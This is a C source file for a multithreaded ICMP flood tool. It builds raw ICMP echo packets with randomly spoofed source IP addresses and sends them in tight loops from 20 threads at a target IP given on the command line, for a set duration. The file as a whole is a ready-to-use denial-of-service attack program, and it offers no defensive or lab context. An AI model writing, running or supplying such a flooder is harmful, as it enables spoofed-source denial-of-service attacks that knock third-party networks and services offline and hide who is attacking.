#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <pthread.h>

#define PACKET_SIZE 4096
#define THREADS 20  // Increase the thread count for higher stress

// IP header structure
struct ipheader {
    unsigned char  iph_ihl:4, iph_ver:4;
    unsigned char  iph_tos;
    unsigned short iph_len;
    unsigned short iph_ident;
    unsigned short iph_offset;
    unsigned char  iph_ttl;
    unsigned char  iph_protocol;
    unsigned short iph_chksum;
    unsigned int   iph_source;
    unsigned int   iph_dest;
};

// ICMP header structure
struct icmpheader {
    unsigned char icmp_type;
    unsigned char icmp_code;
    unsigned short icmp_cksum;
    unsigned short icmp_id;
    unsigned short icmp_seq;
};

// Pseudo header for checksum calculation
struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
};

// Function to calculate checksum
unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    unsigned short *ptr = buf;
    unsigned short oddbyte;
    
    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }
    
    if (len == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }
    
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}

// Function to generate a random IP address
void random_ip(char *ip) {
    sprintf(ip, "%d.%d.%d.%d", rand() % 255, rand() % 255, rand() % 255, rand() % 255);
}

// ICMP flooder function
void icmp_flood(const char *target, int duration) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("ICMP socket");
        exit(1);
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = 0;
    sin.sin_addr.s_addr = inet_addr(target);

    char packet[PACKET_SIZE];
    struct ipheader *ip = (struct ipheader *)packet;
    struct icmpheader *icmp_pkt = (struct icmpheader *)(packet + sizeof(struct ipheader));

    time_t start = time(NULL);
    int count = 0;

    while ((time(NULL) - start) < duration) {
        memset(packet, 0, PACKET_SIZE);

        // ICMP Header
        icmp_pkt->icmp_type = ICMP_ECHO;
        icmp_pkt->icmp_code = 0;
        icmp_pkt->icmp_id = rand();
        icmp_pkt->icmp_seq = rand();
        icmp_pkt->icmp_cksum = 0;

        // Calculate ICMP checksum
        icmp_pkt->icmp_cksum = checksum((unsigned short *)icmp_pkt, sizeof(struct icmpheader));

        // Randomize source IP to spoof
        char spoof_ip[16];
        random_ip(spoof_ip);

        ip->iph_ver = 4;
        ip->iph_ihl = 5;
        ip->iph_tos = 0;
        ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct icmpheader));
        ip->iph_ident = htons(rand() % 65535);
        ip->iph_offset = 0;
        ip->iph_ttl = 255;
        ip->iph_protocol = IPPROTO_ICMP;
        ip->iph_source = inet_addr(spoof_ip);
        ip->iph_dest = sin.sin_addr.s_addr;
        ip->iph_chksum = checksum((unsigned short *)packet, sizeof(struct ipheader));

        // Send the packet in tight loop
        sendto(sock, packet, sizeof(struct ipheader) + sizeof(struct icmpheader), 0, (struct sockaddr *)&sin, sizeof(sin));

        // Optional: Print packet count for feedback
        count++;
        if (count % 1000 == 0) {
            printf("\rSent %d packets", count);  // Real-time packet count
        }
    }

    close(sock);
}

// Thread function to run ICMP flood
void *icmp_flood_thread(void *args) {
    char *target = ((char **)args)[0];
    int duration = atoi(((char **)args)[1]);
    
    icmp_flood(target, duration);
    return NULL;
}

// Main function
int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <target IP> <duration (seconds)>\n", argv[0]);
        return 1;
    }

    const char *target = argv[1];
    int duration = atoi(argv[2]);

    pthread_t threads[THREADS];

    printf("Starting ICMP flood on target: %s for %d seconds...\n", target, duration);

    // Spawn multiple threads for maximum power
    for (int i = 0; i < THREADS; i++) {
        char *args[] = { (char *)target, argv[2] };
        pthread_create(&threads[i], NULL, icmp_flood_thread, args);
    }

    // Wait for threads to finish
    for (int i = 0; i < THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\nICMP Flood complete.\n");
    return 0;
}
